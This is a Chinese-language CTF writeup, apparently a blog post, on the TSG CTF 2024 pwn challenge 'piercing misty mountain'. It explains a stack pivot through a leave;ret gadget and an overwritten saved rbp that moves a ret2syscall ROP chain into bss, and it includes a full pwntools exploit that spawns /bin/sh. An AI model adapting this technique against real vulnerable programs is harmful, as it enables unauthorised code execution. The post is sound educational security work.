---
date: 2024-12-17 10:29:05
layout: post
title: TSG CTF 2024 pwn 方向 writeup 合集
subtitle: 
description: >-
    复现一波吧
image: >-
  /assets/img/uploads/autumn_cat.jpg
optimized_image: >-
  /assets/img/uploads/autumn_cat.jpg
category: ctf
tags:
  - SECCON
  - TSG CTF
  - pwn
  - heap exploitation
author: rosayxy
paginate: true
---
发现自己在一些思路或者是 trick 上还是不够熟练啊，于是进行一点题的做      
因为同步在做其他题所以可能慢慢更新...     
## piercing misty mountain
静态链接的程序，给了一次16字节的溢出，无 canary   
首先就是想到栈迁移，但是在该次溢出前，没有往 bss 段进行写的机会，只可以写栈更高的位置，所以一开始的想法是找一个升栈的 gadget，把栈升到一开始有输入的地方，但是在第一次输入和溢出之间，有一次 0x4000 的降栈     
所有升栈的 gadget 都不能升那么大，于是无法战胜，最终由队友 k4ra5u 在比赛时解出（khls tql!）    

### 思路
它含有溢出的函数返回用的是 `leave;ret`，而 `leave` 相当于下面这两条指令
```
mov esp, ebp
pop ebp
```
因为我们可以赋值到 old_rbp 于是在栈溢出时，可以控制到 rbp    
然后看到第一次读入的时候，是**相对于 rbp 寻址** 如下：    
![alt_text](/assets/img/uploads/rbp.png)

如果我们把old_rbp 改到 bss 段，把返回地址改到这里的话，就可以正常读入了！由于是静态链接，我们可以直接把 ret2syscall ropchain 写到 bss 段     
紧接着，我们再次到了那个溢出的函数，我们把 old_rbp 改为该 ropchain 地址 -8 然后覆盖返回地址为 `leave;ret` gadget 地址，从而栈迁移执行 ROPchain    
感觉这个找 gadget 的思路有点像去年 seccon-quals 的简单题 ROP-2.35    

### exp
```py
from pwn import*
context(log_level="debug", arch="amd64", os="linux")
p=process("./piercing_misty_mountain")

p.recvuntil("Name > ")
p.sendline("A"*0x20)
p.recvuntil("Job\n")
p.sendline("3")
fake_rbp = 0x4c73c0 + 0x1000
payload = b"a"*4 + p64(fake_rbp) + p64(0x401AAB)
p.recvuntil("Job > ")
p.send(payload)
# gdb.attach(p)
# pause()
p.recvuntil("Age > ")
p.sendline("13")
sleep(0.1)
pop_rdi = 0x40217f
pop_rsi = 0x40a1ee
pop_rax = 0x450847
pop_rdx = 0x44afa2
syscall = 0x044FDF0
binshell = 0x4c73c0 + 0x100
payload = p64(pop_rdi) + p64(binshell) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(59) + p64(syscall)
payload = payload.ljust(0x100, b"\x00") + b"/bin/sh\x00"
p.sendline(payload)
p.recvuntil("Job\n")
p.sendline("3")
payload = b"a"*4 + p64(0x4c73b8) + p64(0x401A63)
p.recvuntil("Job > ")
p.send(payload)
p.recvuntil("Age > ")
p.sendline("13")

p.interactive()

```